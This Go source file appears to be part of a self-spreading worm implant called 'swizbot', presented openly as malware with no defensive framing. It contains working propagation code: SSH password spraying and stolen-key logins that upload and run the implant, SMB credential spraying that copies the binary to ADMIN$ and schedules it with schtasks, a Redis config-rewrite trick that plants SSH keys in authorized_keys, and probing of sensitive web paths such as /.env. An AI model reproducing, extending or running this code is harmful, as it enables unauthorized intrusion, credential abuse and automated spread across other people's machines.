package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// wormPayload returns the bytes deployed to a freshly compromised host:
// the configured download URL if present, otherwise a copy of the
// running implant (same-OS lateral movement).
func wormPayload() ([]byte, error) {
	if cfg.WormDownloadURL != "" {
		data, err := httpGetBytes(cfg.WormDownloadURL, 30*time.Second, 100<<20)
		if err != nil {
			return nil, err
		}
		return data, nil
	}
	exe, err := os.Executable()
	if err != nil {
		return nil, err
	}
	data, err := os.ReadFile(exe)
	if err != nil {
		return nil, err
	}
	return data, nil
}

func httpGetBytes(rawURL string, timeout time.Duration, max int64) ([]byte, error) {
	client := newHTTPClient(timeout)
	resp, err := client.Get(rawURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("download %s: status %d", rawURL, resp.StatusCode)
	}
	limited := &ioLimitedReader{r: resp.Body, n: max}
	data, err := ioReadAll(limited)
	if err != nil {
		return nil, err
	}
	if limited.n <= 0 {
		return nil, fmt.Errorf("download exceeds %d bytes", max)
	}
	return data, nil
}

// --- SSH vector -------------------------------------------------------

// exploitSSH sprays harvested and default credentials, then key-based
// auth from stolen keys. On success it stages and launches the implant.
func (w *Worm) exploitSSH(host string) (bool, string) {
	credMu.Lock()
	users := append([]string(nil), credUsers...)
	passes := append([]string(nil), credPasses...)
	signers := append([]ssh.Signer(nil), credKeys...)
	credMu.Unlock()
	if len(users) == 0 {
		return false, "no usernames available"
	}

	payload, perr := wormPayload()
	if perr != nil {
		return false, "payload unavailable: " + perr.Error()
	}

	tried := 0
	maxTries := 24
	for _, user := range users {
		for _, pass := range passes {
			if tried >= maxTries {
				return false, "attempt budget exhausted"
			}
			tried++
			w.attempts.Add(1)
			cfg := sshClientConfig(user, []ssh.AuthMethod{ssh.Password(pass)}, 5*time.Second)
			client, err := ssh.Dial("tcp", net.JoinHostPort(host, "22"), cfg)
			if err != nil {
				continue
			}
			if derr := deploySSH(client, user, payload); derr != nil {
				client.Close()
				return false, "auth ok but deploy failed: " + derr.Error()
			}
			client.Close()
			return true, fmt.Sprintf("user=%s (password)", user)
		}
	}

	// key-based auth with stolen keys against common accounts
	for _, signer := range signers {
		for _, user := range users[:minInt(len(users), 6)] {
			if tried >= maxTries {
				return false, "attempt budget exhausted"
			}
			tried++
			w.attempts.Add(1)
			cfg := sshClientConfig(user, []ssh.AuthMethod{ssh.PublicKeys(signer)}, 5*time.Second)
			client, err := ssh.Dial("tcp", net.JoinHostPort(host, "22"), cfg)
			if err != nil {
				continue
			}
			if derr := deploySSH(client, user, payload); derr != nil {
				client.Close()
				return false, "key auth ok but deploy failed: " + derr.Error()
			}
			client.Close()
			return true, fmt.Sprintf("user=%s (key %s)", user, sshKeyFingerprint(signer))
		}
	}
	return false, ""
}

func sshClientConfig(user string, methods []ssh.AuthMethod, timeout time.Duration) *ssh.ClientConfig {
	return &ssh.ClientConfig{
		User:            user,
		Auth:            methods,
		Timeout:         timeout,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
}

func sshKeyFingerprint(s ssh.Signer) string {
	pub := s.PublicKey()
	return ssh.FingerprintSHA256(pub)
}

// deploySSH uploads payload to ~/.cache and launches it detached.
func deploySSH(client *ssh.Client, user string, payload []byte) error {
	remotePath := fmt.Sprintf(".cache/swizbot-%d", time.Now().UnixNano())

	sess, err := client.NewSession()
	if err != nil {
		return err
	}
	cmd := fmt.Sprintf("mkdir -p .cache && cat > %q", remotePath)
	sess.Stdin = bytesReader(payload)
	if err := sess.Run(cmd); err != nil {
		sess.Close()
		return err
	}
	sess.Close()

	sess2, err := client.NewSession()
	if err != nil {
		return err
	}
	defer sess2.Close()
	launch := fmt.Sprintf("chmod 700 %q && nohup %q >/dev/null 2>&1 &", remotePath, remotePath)
	return sess2.Run(launch)
}

// --- SMB vector -------------------------------------------------------

// exploitSMB sprays credentials with net.exe and stages via ADMIN$ +
// scheduled task. Windows-only (net.exe / schtasks).
func (w *Worm) exploitSMB(host string) (bool, string) {
	if runtime.GOOS != "windows" {
		return false, "SMB vector requires the Windows implant build"
	}
	credMu.Lock()
	users := append([]string(nil), credUsers...)
	passes := append([]string(nil), credPasses...)
	credMu.Unlock()

	exe, err := os.Executable()
	if err != nil {
		return false, "self path unavailable"
	}

	tried := 0
	maxTries := 24
	for _, user := range users {
		for _, pass := range passes {
			if tried >= maxTries {
				return false, "attempt budget exhausted"
			}
			tried++
			w.attempts.Add(1)
			ipc := fmt.Sprintf(`\\%s\IPC$`, host)
			if err := exec.Command("net", "use", ipc, pass, "/USER:"+user).Run(); err != nil {
				continue
			}
			defer exec.Command("net", "use", ipc, "/delete", "/y").Run()
			if derr := deploySMB(host, user, pass, exe); derr != nil {
				return false, "auth ok but deploy failed: " + derr.Error()
			}
			return true, fmt.Sprintf("user=%s", user)
		}
	}
	return false, ""
}

func deploySMB(host, user, pass, exe string) error {
	admin := fmt.Sprintf(`\\%s\ADMIN$`, host)
	if err := exec.Command("net", "use", admin, pass, "/USER:"+user).Run(); err != nil {
		return err
	}
	defer exec.Command("net", "use", admin, "/delete", "/y").Run()

	// copy self to ADMIN$ (= C:\Windows on the target)
	if err := exec.Command("cmd", "/C", "copy", "/Y", exe, admin+`\swizbot.exe`).Run(); err != nil {
		return err
	}
	// schedule it to run
	return exec.Command("schtasks", "/create", "/s", host, "/u", user, "/p", pass,
		"/tn", "swizBOT", "/tr", `C:\Windows\swizbot.exe`, "/sc", "once", "/st", "23:59", "/f").Run()
}

// --- Redis vector -----------------------------------------------------

// exploitRedis rewrites the Redis config to plant an authorized SSH key
// (when the process has write access to a target .ssh directory).
// addr is host:port.
func (w *Worm) exploitRedis(addr string) (bool, string) {
	keyLine := ""
	credMu.Lock()
	for _, s := range credKeys {
		if kl := sshPubkeyLine(s); kl != "" {
			keyLine = kl
			break
		}
	}
	users := append([]string(nil), credUsers...)
	credMu.Unlock()
	if keyLine == "" {
		return false, "no ssh key material available for redis vector"
	}

	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return false, "dial failed"
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	w.attempts.Add(1)

	// candidate .ssh dirs: root first, then each known user
	dirs := []string{"/root/.ssh"}
	for _, u := range users {
		if u != "root" {
			dirs = append(dirs, "/home/"+u+"/.ssh")
		}
	}
	for _, dir := range dirs {
		if !redisOK(conn, "CONFIG", "SET", "dir", dir) {
			continue
		}
		if !redisOK(conn, "CONFIG", "SET", "dbfilename", "authorized_keys") {
			continue
		}
		if !redisOK(conn, "SET", "swizbot", keyLine+"\n") {
			continue
		}
		if !redisOK(conn, "SAVE") {
			continue
		}
		return true, "ssh key planted via redis (" + dir + ")"
	}
	return false, "redis reachable but config rewrite failed"
}

func redisOK(conn net.Conn, args ...string) bool {
	var b strings.Builder
	fmt.Fprintf(&b, "*%d\r\n", len(args))
	for _, a := range args {
		fmt.Fprintf(&b, "$%d\r\n%s\r\n", len(a), a)
	}
	if _, err := conn.Write([]byte(b.String())); err != nil {
		return false
	}
	line, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return false
	}
	return strings.HasPrefix(line, "+OK")
}

// --- Web recon --------------------------------------------------------

var webProbePaths = []string{
	"/.env", "/admin/", "/phpmyadmin/", "/wp-login.php",
	"/actuator/env", "/server-status", "/api/v1/", "/config.php",
}

// probeWeb checks common sensitive paths and reports findings. It is
// recon: no payload is claimed to have been dropped.
func (w *Worm) probeWeb(host, port string) (bool, string) {
	scheme := "http"
	if port == "443" || port == "8443" {
		scheme = "https"
	}
	base := fmt.Sprintf("%s://%s", scheme, net.JoinHostPort(host, port))
	client := newHTTPClient(5 * time.Second)
	for _, path := range webProbePaths {
		select {
		case <-w.done:
			return false, ""
		default:
		}
		resp, err := client.Get(base + path)
		if err != nil {
			continue
		}
		code := resp.StatusCode
		drainBody(resp)
		if code == 200 {
			return false, fmt.Sprintf("web recon %s%s -> 200", base, path)
		}
	}
	return false, ""
}
